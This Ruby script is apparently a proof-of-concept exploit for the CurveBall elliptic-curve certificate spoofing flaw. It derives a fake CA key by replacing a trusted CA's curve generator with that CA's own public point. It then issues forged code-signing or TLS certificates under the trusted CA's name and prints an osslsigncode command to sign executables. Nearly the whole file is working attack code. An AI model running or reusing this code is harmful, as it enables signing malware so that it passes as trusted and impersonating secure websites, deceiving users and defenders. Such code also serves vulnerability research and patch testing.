require 'openssl'

def gen_rog_key(trusted_ca)

    # Parse public key from CA
    ca_key = trusted_ca.public_key
    if !(ca_key.instance_of? OpenSSL::PKey::EC) then
        puts "CA NOT ECC"
        puts "Type: " + key.inspect
        exit
    end

    # Set new group with fake generator G = Q
    ca_key.private_key = 1
    group = ca_key.group
    group.set_generator(ca_key.public_key, group.order, group.cofactor)
    group.asn1_flag = OpenSSL::PKey::EC::EXPLICIT_CURVE
    ca_key.group = group

    return ca_key
end

def generate_rogue_ca(trusted_ca_filename, issuer="", subject="")
    #Create the rogue AC
    raw = File.read trusted_ca_filename
    trusted_ca = OpenSSL::X509::Certificate.new(raw)
    ca_key = gen_rog_key(trusted_ca)
    
    ca_cert = OpenSSL::X509::Certificate.new()
    ca_cert.version = 2
    ca_cert.serial = 1
    if issuer != "" then
        ca_cert.issuer = OpenSSL::X509::Name.parse issuer
    else
        ca_cert.issuer = trusted_ca.issuer
    end

    if subject != "" then
        ca_cert.subject = OpenSSL::X509::Name.parse subject
    else
        ca_cert.subject = trusted_ca.subject
    end
    ca_cert.public_key = ca_key

    # Set validity timeframe
    ca_cert.not_before = Time.now
    ca_cert.not_after = ca_cert.not_before + 2 * 365 * 24 * 60 * 60

    # Set certificate extensions
    ef = OpenSSL::X509::ExtensionFactory.new
    ef.subject_certificate = trusted_ca
    ef.issuer_certificate = trusted_ca
    # CA extension
    ca_cert.add_extension(ef.create_extension("basicConstraints","CA:TRUE",true))
    # Key used to sign certificates
    ca_cert.add_extension(ef.create_extension("keyUsage","keyCertSign, cRLSign", true))
    ca_cert.add_extension(ef.create_extension("authorityKeyIdentifier","keyid:always",false))
    ca_cert.add_extension(ef.create_extension("subjectKeyIdentifier","hash",false))

    ca_cert.sign(ca_cert.public_key, OpenSSL::Digest::SHA256.new)
    return ca_cert
end

def generate_csr(rogue_ca, subject)
    # Generate a brand new key for the certificate
    cert_key = OpenSSL::PKey::EC.generate(rogue_ca.public_key.group.curve_name)

    # Initialise the Certificat Request Signing object
    csr = OpenSSL::X509::Request.new
    csr.version = 0
    csr.subject = OpenSSL::X509::Name.parse subject
    csr.public_key = cert_key
    csr.sign(cert_key, OpenSSL::Digest::SHA256.new)
    raise 'CSR can not be verified' unless csr.verify csr.public_key
    return csr
end

def sign_csr(csr, ca, cert_type)
    csr_cert = OpenSSL::X509::Certificate.new
    csr_cert.serial = 0
    csr_cert.version = 2
    csr_cert.not_before = Time.now
    csr_cert.not_before = Time.now
    csr_cert.not_after = Time.now + 600
    csr_cert.public_key = csr.public_key
    csr_cert.issuer = ca.issuer
    csr_cert.subject = csr.subject
    
    # Set certificate extension
    extension_factory = OpenSSL::X509::ExtensionFactory.new
    extension_factory.subject_certificate = csr_cert
    extension_factory.issuer_certificate = ca
    
    csr_cert.add_extension(extension_factory.create_extension('keyUsage', 'digitalSignature'))
    
    # Key used to sign code
    extendedKeyUsage = ""
    if (cert_type == 'exe') then
        extendedKeyUsage = "codeSigning"
    elsif (cert_type == 'tls') then
        extendedKeyUsage = "serverAuth, clientAuth"
    end
    csr_cert.add_extension(extension_factory.create_extension('extendedKeyUsage', extendedKeyUsage))

    csr_cert.sign(ca.public_key, OpenSSL::Digest::SHA256.new)

    return csr_cert
end

def gen_pkcs12(cert, ca)
    pkey= OpenSSL::PKey::EC.generate(cert.public_key.group.curve_name)
    p12 = OpenSSL::PKCS12.create("", "PKCS12", cert.public_key, cert, [ca])
end

def gen_cert(trusted_ca, subject, output_filename, cert_type)
    ca = generate_rogue_ca(trusted_ca)   
    csr = generate_csr(ca, subject)
    cert = sign_csr(csr, ca, cert_type)
    if(cert_type == 'exe')
        pkcs12 = gen_pkcs12(cert, ca)
        open "./build/#{output_filename}", 'w' do |io|
            io.write pkcs12.to_der
        end
    else
        open "./build/cert.key", 'w' do |io|
            io.write cert.public_key.to_pem
        end
        open "./build/spoofed_ca.crt", 'w' do |io|
            io.write ca.to_pem
        end
        open "./build/#{output_filename}", 'w' do |io|
            io.write cert.to_pem
        end
    end
end

args = Hash[ ARGV.flat_map{|s| s.scan(/--?([^=\s]+)(?:=(\S+))?/) } ]
mandatory_parameters = (args.include?('in') && args['in'] != nil) && (args.include?('out') && args['out'] != nil);
mandatory_parameters = mandatory_parameters && (args.include?('type') && args['type'] != nil)

if (mandatory_parameters) then
    trusted_ca_filename = args['in']
    cert_filename = args['out']
    cert_type = args['type']
else
    abort('-in=trusted_ca.crt and -out=cert.p12 options are mandatory')
end

if (args.include?('subj') and args['subj'] != nil) then
    cert_subject = args['subj']
else
    cert_subject = "/C=France/ST=IleDeFrance/L=Paris/O=YoannDqr/CN=your.site.com"
end
if (args.include?('exe') and args['exe'] != nil) then
    exe_to_sign = args['exe']
else
    exe_to_sign = 'file.exe'
end
if (args.include?'time') then
    timestamp = '-t http://timestamp.verisign.com/scripts/timstamp.dll'
else
    timestamp = ''
end

gen_cert(trusted_ca_filename, cert_subject, cert_filename, cert_type)

if (!args.include?('sh')) then
    if(cert_type == 'exe')
        puts("\nrun the following command to sign an PE executable:\n")
    elsif(cert_type == 'tls')
        puts("\nTLS certificate generated in ./build")
    end
end

if(cert_type == 'exe') then
    puts("osslsigncode sign -pkcs12 ./build/#{cert_filename} -n 'Signed by YoannDqr'#{timestamp} -in #{exe_to_sign} -out ./build/signed_#{exe_to_sign}\n")
end

if (!args.include?('sh')) then
    puts("\n\n")
end
